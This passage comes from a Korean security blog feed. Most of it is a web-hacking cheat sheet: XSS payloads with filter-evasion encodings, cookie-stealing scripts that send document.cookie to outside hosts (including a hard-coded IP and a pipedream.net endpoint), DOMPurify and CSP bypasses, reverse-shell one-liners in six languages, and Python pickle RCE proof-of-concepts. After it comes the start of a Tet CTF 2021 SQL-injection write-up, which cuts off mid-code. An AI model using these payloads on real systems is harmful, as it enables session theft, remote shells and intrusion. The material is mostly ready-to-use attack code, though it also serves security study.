class="attr">162</span>\<span class="attr">164</span>\<span class="attr">50</span>\<span class="attr">61</span>\<span class="attr">51</span>&#x27;) &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">eval(String.fromCharCode(97,108,101,114,116,40,49,41))</span> &gt;</span></span><br><span class="line">  </span><br><span class="line">iframe tag</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116&amp;#40&amp;#49&amp;#41</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">srcdoc</span>=<span class="string">&quot;&lt;img src=x:x onerror=alert(1)&gt;&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">location</span>=<span class="string">&#x27;javascri&#x27;</span><span class="attr">.concat</span>(&#x27;<span class="attr">pt:aler</span>&#x27;,&#x27;<span class="attr">t</span>(<span class="attr">1</span>)&#x27;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">location</span>=<span class="string">[</span>&#x27;<span class="attr">java</span>&#x27;,&#x27;<span class="attr">script:</span>&#x27;,&#x27;<span class="attr">alert</span>(<span class="attr">1</span>)&#x27;]<span class="attr">.join</span>(&quot;&quot;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line">body tag</span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onpageshow</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line">&lt;body/onfocus=alert(1)&gt;</span><br><span class="line">&lt;body/onload=alert(1)&gt;</span><br><span class="line">&lt;body/onload=document.write(String.fromCharCode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,60,47,115,99,114,105,112,116,62)) &gt;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">input tag</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">autofocus</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">image</span> <span class="attr">src</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onblur</span>=<span class="string">alert(1)</span> <span class="attr">id</span>=<span class="string">x</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">autofocus</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onbeforecopy</span>=<span class="string">alert(1)</span> <span class="attr">value</span>=<span class="string">&quot;XSS&quot;</span> <span class="attr">autofocus</span>&gt;</span></span><br><span class="line">&lt;input/autofocus/onfocus=&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116&amp;#40&amp;#49&amp;#41&gt;</span><br><span class="line">  </span><br><span class="line">a tag</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onmouseover</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span>link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">#</span> <span class="attr">name</span>=<span class="string">xss</span> <span class="attr">autofocus</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">draggable</span>=<span class="string">&quot;true&quot;</span> <span class="attr">ondragend</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:&#x27;\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76&#x27;&quot;</span>&gt;</span>link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">video tag</span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">onkeypress</span>=<span class="string">&quot;alert(1)&quot;</span> <span class="attr">contenteditable</span>&gt;</span><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(/xss/)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span> <span class="attr">onloadstart</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"></span><br><span class="line">button tag</span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span> <span class="attr">autofocus</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">ondblclick</span>=<span class="string">&quot;alert(1)&quot;</span> <span class="attr">autofocus</span> <span class="attr">tabindex</span>=<span class="string">1</span>&gt;</span>test<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onkeyup</span>=<span class="string">&quot;alert(1)&quot;</span> <span class="attr">contenteditable</span>&gt;</span>test<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">object tag</span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">&#x27;data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">type</span>=<span class="string">&#x27;text/x-scriptlet&#x27;</span> <span class="attr">data</span>=<span class="string">&#x27;http://example.com/xss.html&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line">  xss.html -&gt; <span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">embed tag</span><br><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">embed</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">audio tag</span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(/xss/)</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">textarea tag</span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">autofocus</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">meter tag</span><br><span class="line"><span class="tag">&lt;<span class="name">meter</span> <span class="attr">onmouseover</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">meter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meter</span> <span class="attr">onmousemove</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">meter</span>&gt;</span></span><br><span class="line"></span><br><span class="line">select tag</span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">autofocus</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"></span><br><span class="line">form tag</span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">onsubmit</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">submit</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> Cookie Stealth</strong><br></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">fetch(<span class="string">&#x27;url&#x27;</span>%2bdocument.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">(<span class="keyword">new</span> Image).src=<span class="string">&#x27;url&#x27;</span>%2bdocument.cookie;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;//code.jquery.com/jquery.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">$.get(<span class="string">&#x27;url&#x27;</span>%2bdocument.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;//code.jquery.com/jquery.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">$.getScript(<span class="string">&quot;//domain&quot;</span>%2bdocument.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">&quot;javascript:document.location=&#x27;url&#x27;%2bdocument.cookie&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">location</span>=<span class="string">&#x27;javascri&#x27;</span><span class="attr">.concat</span>(&quot;<span class="attr">pt:document</span>&quot;,&quot;<span class="attr">.location</span>=<span class="string">&quot;,&quot;</span>&#x27;<span class="attr">url</span>&#x27;%<span class="attr">2bdocument.cookie</span>&quot;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">location</span>=<span class="string">[</span>&quot;<span class="attr">java</span>&quot;,&quot;<span class="attr">script:</span>&quot;,&quot;<span class="attr">document.location</span>=<span class="string">&quot;,&quot;</span>&#x27;<span class="attr">url</span>&#x27;%<span class="attr">2bdocument.cookie</span>&quot;]<span class="attr">.join</span>(&quot;&quot;)&gt;</span></span><br><span class="line">&lt;svg/onload=setTimeout(&quot;\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003a\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074\u002e\u006c\u006f\u0063\u0061\u0074\u0069\u006f\u006e\u003d\u0027\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0031\u0034\u0031\u002e\u0031\u0036\u0034\u002e\u0035\u0032\u002e\u0032\u0030\u0037\u003a\u0031\u0032\u0033\u0034\u0035\u002f\u003f\u0061\u003d\u0027\u002b\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074\u002e\u0063\u006f\u006f\u006b\u0069\u0065&quot;)&gt;</span><br><span class="line">&lt;script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.js&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&lt;div/ng-app&gt;&lt;input/autofocus/ng-focus=$event.path|orderBy:&#x27;[].constructor.from([location.replace(&quot;//384bbb03a643480f7077ff3d9d4b01d5.m.pipedream.net?&quot;+document.cookie)],console.log)&#x27;&gt;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><hr><h2 id="DOMPurify-Bypass"><a href="#DOMPurify-Bypass" class="headerlink" title="DOMPurify Bypass"></a>DOMPurify Bypass<br></h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">math</span>&gt;</span><span class="tag">&lt;<span class="name">mtext</span>&gt;</span><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">mglyph</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="xml"><span class="tag">&lt;/<span class="name">math</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">mglyph</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span><span class="tag">&lt;/<span class="name">mtext</span>&gt;</span><span class="tag">&lt;/<span class="name">math</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">math</span>&gt;</span><span class="tag">&lt;<span class="name">mtext</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">mglyph</span>&gt;</span><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">mtext</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span>&lt;path id=&quot;<span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span> <span class="attr">src</span>&gt;</span>&quot;&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span>&lt;a id=&quot;<span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span>&quot;&gt;</span><br></pre></td></tr></table></figure><hr><h2 id="CSP-Bypass"><a href="#CSP-Bypass" class="headerlink" title="CSP Bypass"></a>CSP Bypass<br></h2><p><span style="color:#21C587">&#35;</span><strong> Use an accepted domain</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src &#39;self&#39; http:&#x2F;&#x2F;141.164.52.207</span><br></pre></td></tr></table></figure><p><strong>위와 같이 나 자신과 특정(<a href="http://141.164.52.207/">http://141.164.52.207</a>) 도메인에서 오는 스크립트는 실행이 가능한 경우, 해당 서버에 파일(xss poc)을 업로드하고, poc 코드를 불러오면 위와 같은 CSP를 우회할 수 있습니다.</strong><br><br></p><p><span style="color:#21C587">&#35;</span><strong> Header Injection</strong><br></p><p><strong>만약 헤더 인젝션이 가능하다고 가정하에 응답 코드를 102와 같은 것들로 수정하면 브라우저는 CSP를 해석하지 않아 우회가 가능합니다.</strong><br><br></p><p><span style="color:#21C587">&#35;</span><strong> AngularJS xss</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#39;self&#39; script-src &#39;self&#39; cdnjs.cloudflare.com;</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.js&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&lt;div/ng-app&gt;&lt;input/autofocus/ng-focus=$event.path|orderBy:&#x27;[].constructor.from([1],alert)&#x27;&gt;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.js&gt;<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&lt;div/ng-app&gt;&lt;input/autofocus/ng-focus=$event.path|orderBy:&#x27;[].constructor.from([location.replace(&quot;url&quot;+document.cookie)],console.log)&#x27;&gt;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>만약 위와 같이 <code>cdnjs.cloudflare.com</code>와 같이 AngularJS를 가져와서 사용할 수 있을 경우 AngularJS XSS를 이용하면 CSP를 우회할 수 있고, 예시 페이로드는 위와 같습니다.</strong><br></p><p><span style="color:#21C587">&#35;</span><strong> CSP Option ↔ Bypass</strong><br></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: </span><br><span class="line">default-src &#x27;self&#x27; data: *; connect-src &#x27;self&#x27;; script-src  &#x27;self&#x27; ;</span><br><span class="line">report-uri /_csp; upgrade-insecure-requests</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">srcdoc</span>=<span class="string">&#x27;&lt;script src=&quot;data:text/javascript,alert(1)&quot;&gt;&lt;/script&gt;&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src https://google.com &#x27;unsafe-eval&#x27; data: http://*; </span><br><span class="line">child-src &#x27;none&#x27;; </span><br><span class="line">report-uri /Report-parsing-url;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><hr><h2 id="Reverse-Shell"><a href="#Reverse-Shell" class="headerlink" title="Reverse Shell"></a>Reverse Shell<br></h2><p><span style="color:#21C587">&#35;</span><strong> Bash</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;domain&#x2F;port 0&gt;&amp;1</span><br><span class="line">bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;domain&#x2F;port 0&gt;&amp;1&#39;</span><br><span class="line">0&lt;&amp;196;exec 196&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;domain&#x2F;port; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> PHP</strong><br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;domain&quot;,port);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> Python</strong><br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;kaibro.tw&quot;,5566));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> Node.js</strong><br></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> net = <span class="built_in">require</span>(<span class="string">&quot;net&quot;</span>), sh = <span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).exec(<span class="string">&quot;/bin/bash&quot;</span>); <span class="keyword">var</span> client = <span class="keyword">new</span> net.Socket(); client.connect(port, <span class="string">&quot;domain&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;client.pipe(sh.stdin);sh.stdout.pipe(client); sh.stderr.pipe(client);&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).exec(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/domain/port 0&gt;&amp;1&#x27;&quot;</span>);</span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> Ruby</strong><br></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e <span class="string">&#x27;exit if fork;c=TCPSocket.new(&quot;domain&quot;,&quot;port&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span></span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> Powershell</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object System.Net.Webclient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;besimorhino&#x2F;powercat&#x2F;master&#x2F;powercat.ps1&#39;);powercat -c domain -p port -e cmd</span><br></pre></td></tr></table></figure><hr><h2 id="Python-Pickle-RCE-PoC"><a href="#Python-Pickle-RCE-PoC" class="headerlink" title="Python Pickle RCE PoC"></a>Python Pickle RCE PoC<br></h2><p><span style="color:#21C587">&#35;</span><strong> eval</strong><br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> __builtins__</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">rce</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">    x = <span class="string">&quot;open(&#x27;bash -i &gt;&amp; /dev/tcp/domain/port 0&gt;&amp;1&#x27;).read()&quot;</span></span><br><span class="line">    <span class="keyword">return</span> (__builtins__.<span class="built_in">eval</span>, (x,))</span><br><span class="line"></span><br><span class="line">print(base64.b64encode(pickle.dumps(rce())))</span><br></pre></td></tr></table></figure><p><span style="color:#21C587">&#35;</span><strong> os.system</strong><br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">rce</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">    <span class="keyword">return</span> (os.system, (<span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/domain/port 0&gt;&amp;1&#x27;</span>,))</span><br><span class="line"></span><br><span class="line">print(base64.b64encode(pickle.dumps(rce())))</span><br></pre></td></tr></table></figure><hr><p><em>Reference</em> : <a href="https://www.anquanke.com/post/id/176185">https://www.anquanke.com</a><br><br><em>Reference</em> : <a href="https://owasp.org/www-community/xss-filter-evasion-cheatsheet">https://owasp.org/www-community/xss-filter-evasion-cheatsheet</a><br><br><em>Reference</em> : <a href="https://bittherapy.net/post/a-trick-to-bypass-an-xss-filter-and-execute-javascript/">https://bittherapy.net/post/a-trick-to-bypass-an-xss-filter-and-execute-javascript/</a><br><br><em>Reference</em> : <a href="https://medium.com/@schopath/bug-bounty-berburu-server-side-request-forgery-ssrf-yuk-2-image-svg-61ecf3ca1951">https://medium.com/@schopath/bug-bounty-berburu-server-side-request-forgery-ssrf-yuk-2-image-svg-61ecf3ca1951</a><br><br><em>Reference</em> : <a href="https://twitter.com/HolyBugx/status/1348928810620743682">https://twitter.com/HolyBugx</a><br><br><em>Reference</em> : <a href="https://github.com/w181496/Web-CTF-Cheatsheet">https://github.com/w181496/Web-CTF-Cheatsheet</a><br><br><em>Reference</em> : <a href="https://gist.github.com/mgeeky/cbc7017986b2ec3e247aab0b01a9edcd">https://gist.github.com/mgeeky/cbc7017986b2ec3e247aab0b01a9edcd</a><br><br><em>Reference</em> : <a href="https://hackerone.com/reports/1024734">https://hackerone.com/reports/1024734</a></p><hr>]]></content>
      
      
      <categories>
          
          <category> Note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CheatSheet </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tet CTF 2021 Write Up</title>
      <link href="2021/01/03/2021-01-03-TetCTF/"/>
      <url>2021/01/03/2021-01-03-TetCTF/</url>
      
        <content type="html"><![CDATA[<p><strong>2021년 1월 1일 오전 9시부터 Tet CTF라는 대회가 열렸습니다. 그래서 이번 대회에서 출제된 SQL Injectino 문제의 풀이를 작성해보겠습니다. 사실 대회는 2일동안 진행했는데 1시간도 안 했음,, 게임 한다고,,</strong></p><hr><p><b><em><span style="color:#21C587">&#35;</span> mysqlimit [100pts]</em></b><br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- The Author of this challenge is so kind <span class="keyword">and</span> handsome that he is giving you flag, just need to bypass his god-tier waf <span class="keyword">and</span> grab it &lt;<span class="number">3</span> --&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;dbconnect.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// filter all what i found on internet.... dunno why ｡ﾟ･（&gt;﹏&lt;）･ﾟ｡</span></span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/union|and|or|on|cast|sys|inno|mid|substr|pad|space|if|case|exp|like|sound|produce|extract|xml|between|count|column|sleep|benchmark|\&lt;|\&gt;|\=/is&#x27;</span> , <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;&lt;img src=&quot;https://i.imgur.com/C42ET4u.gif&quot; /&gt;&#x27;</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// prevent sql injection</span></span><br><span class="line">        <span class="variable">$id</span> = mysqli_real_escape_string(<span class="variable">$conn</span>, <span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$query</span> = <span class="string">&quot;select * from flag_here_hihi where id=&quot;</span>.<span class="variable">$id</span>;</span><br><span class="line">        <span class="variable">$run_query</span> = 